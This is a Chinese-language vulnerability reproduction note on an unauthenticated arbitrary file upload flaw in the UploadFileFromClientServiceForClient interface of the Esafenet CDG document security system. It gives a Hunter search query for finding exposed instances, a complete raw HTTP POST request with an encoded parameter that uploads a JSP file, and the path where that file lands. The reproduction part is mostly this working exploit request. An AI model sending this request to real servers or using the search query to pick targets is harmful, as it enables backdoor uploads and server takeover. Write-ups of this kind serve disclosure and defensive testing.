# 亿赛通电子文档安全管理系统UploadFileFromClientServiceForClient任意文件上传漏洞

# 一、漏洞简介
 亿赛通电子文档安全管理系统（简称：CDG）是一款电子文档安全加密软件，该系统利用驱动层透明加密技术，通过对电子文档的加密保护，防止内部员工泄密和外部人员非法窃取企业核心重要数据资产，对电子文档进行全生命周期防护，系统具有透明加密、主动加密、智能加密等多种加密方式，用户可根据部门涉密程度的不同（如核心部门和普通部门），部署力度轻重不一的梯度式文档加密防护，实现技术、管理、审计进行有机的结合，在内部构建起立体化的整体信息防泄露体系，使得成本、效率和安全三者达到平衡，实现电子文档的数据安全。亿赛通电子文档安全管理系统UploadFileFromClientServiceForClient接口处存在任意文件上传漏洞，未经授权的攻击者可通过此漏洞上传恶意后门文件，从而获取服务器权限。

# 二、影响版本
+ 亿赛通电子文档安全管理系统

# 三、资产测绘
+ hunter`app.name="ESAFENET 亿赛通文档安全管理系统"`
+ 登录页面

![1693912211487-1ee3eb84-62a3-4c32-806a-6be32537dfb6.png](./img/ZyqQDZT3JG_934By/1693912211487-1ee3eb84-62a3-4c32-806a-6be32537dfb6-467164.png)

# 四、漏洞复现
```plain
POST /CDGServer3/UploadFileFromClientServiceForClient?AFMALANMJCEOENIBDJMKFHBANGEPKHNOFJBMIFJPFNKFOKHJNMLCOIDDJGNEIPOLOKGAFAFJHDEJPHEPLFJHDGPBNELNFIICGFNGEOEFBKCDDCGJEPIKFHJFAOOHJEPNNCLFHDAFDNCGBAEELJFFHABJPDPIEEMIBOECDMDLEPBJGBGCGLEMBDFAGOGM HTTP/1.1
Host: xxx.xxx.xxx.xxx
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36
Accept-Encoding: gzip, deflate
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,\*/\*;q=0.8,application/signed-exchange;v=b3;q=0.7
Connection: close
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
Accept-Language: zh-CN,zh;q=0.9
Cookie: JSESSIONID=22C9717F219D60381079FEBCDC6F635A
Content-Length: 9

014435897
```

![1694274433318-8bf201e7-b8c9-4cc7-be8f-d29984fa0503.png](./img/ZyqQDZT3JG_934By/1694274433318-8bf201e7-b8c9-4cc7-be8f-d29984fa0503-721543.png)

上传文件位置

```plain
http://xx.xx.xx.xx/tttT.jsp
```

![1694274467839-bff7fb92-08d6-492d-92e5-ba54022d7c57.png](./img/ZyqQDZT3JG_934By/1694274467839-bff7fb92-08d6-492d-92e5-ba54022d7c57-498447.png)



> 更新: 2024-04-20 22:01:35  
> 原文: <https://www.yuque.com/xiaokp7/ocvun2/gny15irlsb3oielm>